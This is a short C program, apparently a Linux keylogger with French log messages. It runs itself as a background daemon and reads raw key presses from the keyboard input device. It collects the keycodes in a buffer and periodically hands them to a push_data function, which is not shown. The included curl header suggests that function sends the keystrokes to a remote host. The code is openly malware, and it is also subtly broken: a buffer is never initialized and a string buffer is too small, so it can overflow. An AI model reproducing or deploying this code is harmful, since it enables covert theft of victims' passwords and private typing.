#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/input.h>
#include <fcntl.h>
#include <curl/curl.h>
#include "header.h"
#include "functions.c"



void main(){

 int count = 0;
 int pid = daemonize();
 printf("PID du démon => %d\n", pid);
  if(pid > 0){
    exit(0);
 }else if (pid < 0){
    perror("Echec lors du clonage.");
    exit(-1);
 }

  int  buffer  = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY); // Open the buffer
  struct input_event ev;
  ssize_t n;
  char bufferString[102];
  char str[3];

     while(1){
       n = read(buffer, &ev, sizeof ev);
       if (ev.type == EV_KEY && ev.value == 1){

         sprintf(str, "%d",  ev.code);
         strcat(bufferString, str);
         strcat(bufferString, "+");
         count += 2;
         if(count == 100){
           push_data(bufferString);
            count = 0;
         }
       }
    }

 close(buffer);
 fflush(stdout);
 exit( EXIT_SUCCESS );
}
